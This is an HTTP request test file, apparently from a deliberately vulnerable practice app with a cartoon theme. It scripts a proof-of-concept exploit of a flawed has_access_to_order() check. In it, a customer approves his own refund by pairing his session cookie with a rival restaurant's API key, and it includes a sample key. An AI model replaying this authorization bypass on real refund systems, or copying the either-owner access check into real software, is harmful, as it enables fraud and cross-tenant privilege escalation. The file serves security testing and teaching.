# @import ../common.http

# VULNERABILITY: Dual-Auth Refund Approval
#
# The vulnerability: has_access_to_order() returns True if EITHER:
# - The customer session owns the order, OR
# - The restaurant API key owns the order's restaurant
#
# Plankton exploits this by:
# 1. Placing an order at Krusty Krab (keeps customer session)
# 2. Requesting a refund for his order
# 3. Approving his own refund using Chum Bucket manager API key
#    (The helper approves because his session owns the order!)


### Step 1: Plankton logs in and creates order at Krusty Krab
# @name cart
{{
  await platform.seed({
    plankton: 200
  });
  exports.planktonCookie = await auth.login("plankton");
}}
POST /cart?restaurant_id=1
Cookie: {{planktonCookie}}

@cart_id = {{$(response).field("cart_id")}}
?? js $(response).status() == 201

### Step 2: Add Krabby Patty to cart
# @name add_item
# @forceRef cart
POST /cart/{{cart_id}}/items
Cookie: {{planktonCookie}}
Content-Type: application/json

{ "item_id": "4" }

?? js $(response).isOk() == true

### Step 3: Checkout the order
# @forceRef add_item
# @name checkout
POST /cart/{{cart_id}}/checkout
Cookie: {{planktonCookie}}
Content-Type: application/json

{ "tip": 1, "delivery_address": "Chum Bucket" }

@order_id = {{$(response).field("order_id")}}
@order_total = {{$(response).total()}}
?? js $(response).status() == 201

### Step 4: Verify balance decreased after order
# @forceRef checkout
GET /account/credits
Cookie: {{planktonCookie}}

@balance_after = {{$(response).balance()}}
?? js $(response).balance() == {{200 - order_total}}

### Step 5: Restaurant delivers the order
# @forceRef checkout
# @name deliver_order
PATCH /orders/{{order_id}}/status
X-API-Key: {{auth.restaurant("krusty_krab")}}
Content-Type: application/x-www-form-urlencoded

status=delivered

?? js $(response).isOk() == true

### Step 6: Request a refund for the order (larger than auto-approve threshold)
# @forceRef deliver_order
# @name refund_request
POST /orders/{{order_id}}/refund
Cookie: {{planktonCookie}}
Content-Type: application/x-www-form-urlencoded

amount={{order_total}}&reason=Bad service

?? js $(response).isOk() == true
?? js $(response).field("status") == pending


# --- EXPLOIT: Plankton approves his own refund ---
# He uses his Chum Bucket manager API key, but keeps his customer cookie.
# The has_access_to_order() helper immediately approves because
# Plankton's session owns the order (even though Chum Bucket doesn't!).

### Step 7: EXPLOIT - Plankton approves refund with Chum Bucket API key
# @name approve_refund
# @forceRef refund_request
PATCH /orders/{{order_id}}/refund/status
Cookie: {{planktonCookie}}
X-API-Key: key-chum-bucket-b5kg32z1je
Content-Type: application/x-www-form-urlencoded

status=approved

?? js $(response).isOk() == true
?? js $(response).field("status") == approved

### Step 8: Verify Plankton received his refund
# @forceRef approve_refund
GET /account/credits
Cookie: {{planktonCookie}}

?? js $(response).balance() == 200.00

# Impact: Plankton approved his own refund at a competitor restaurant
# using his own restaurant's API key. Cross-tenant privilege escalation!
